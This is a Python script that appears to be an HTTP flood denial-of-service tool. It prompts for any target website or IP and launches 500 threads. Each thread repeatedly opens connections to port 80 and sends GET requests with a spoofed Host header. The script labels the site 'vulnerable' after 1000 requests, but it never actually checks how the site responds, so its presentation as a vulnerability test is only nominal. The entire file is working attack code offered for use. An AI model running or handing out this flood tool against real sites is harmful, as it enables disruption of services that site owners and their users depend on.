import socket
import threading
import re
from urllib.parse import urlparse

fake_ip = '182.21.20.32'
port = 80

attack_num = 0
vulnerable = False  # Flag to indicate vulnerability

def convert_to_ip(target):
    try:
        # If the target is an IP address, return it directly
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
            return target
        
        # Otherwise, resolve the domain name to an IP address
        return socket.gethostbyname(target)
    except socket.gaierror:
        print("Invalid target address.")
        return None

def attack(target):
    global vulnerable
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            global attack_num
            attack_num += 1
            print(attack_num)

            # Check website's responsiveness during the attack
            # Modify this condition based on expected behavior of the website
            if attack_num > 1000:
                print("The website seems vulnerable to this attack.")
                vulnerable = True
                break

            s.close()
        except Exception as e:
            print(f"Error: [WinError 10060] {e}")
            break

if __name__ == "__main__":
    target = input("Enter the target website or IP address: ")

    # Parse the target address to extract the hostname
    parsed_target = urlparse(target)
    target_hostname = parsed_target.netloc

    # Convert website hostname to IP if needed
    target_ip = convert_to_ip(target_hostname)

    if target_ip:
        # Start multiple threads to simulate concurrent attacks
        for i in range(500):
            thread = threading.Thread(target=attack, args=(target_ip,))
            thread.start()

        thread.join()  # Wait for all threads to finish

        if not vulnerable:
            print("The website is not vulnerable to this attack.")
